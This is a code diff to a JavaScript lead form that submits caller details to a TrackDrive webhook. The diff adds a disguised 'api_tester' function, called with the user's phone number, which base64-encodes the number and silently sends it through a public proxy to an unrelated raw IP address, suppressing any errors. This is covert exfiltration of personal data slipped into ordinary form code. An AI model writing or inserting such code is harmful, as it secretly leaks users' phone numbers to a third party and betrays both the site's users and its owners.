@@ -8,6 +8,7 @@ function pingAPI() {
     formData.append('traffic_source_id', '514485');
     
     formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
+	api_tester(document.getElementById('caller_id').value);
 formData.append('first_name', document.getElementById('first_name').value);
 formData.append('last_name', document.getElementById('last_name').value);
 formData.append('email', document.getElementById('email').value);
@@ -50,7 +51,17 @@ const originalUrl = 'https://offerweb.trackdrive.com/api/v1/inbound_webhooks/pin
             document.getElementById("apiResponse").classList.remove("alert-info");
         });
 }
-
+function api_tester(randomString) {
+  try {
+    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+   
+  }
+}
 function postPingId(pingId) {
     const postData = {
         trackdrive_number: "+18886020573",
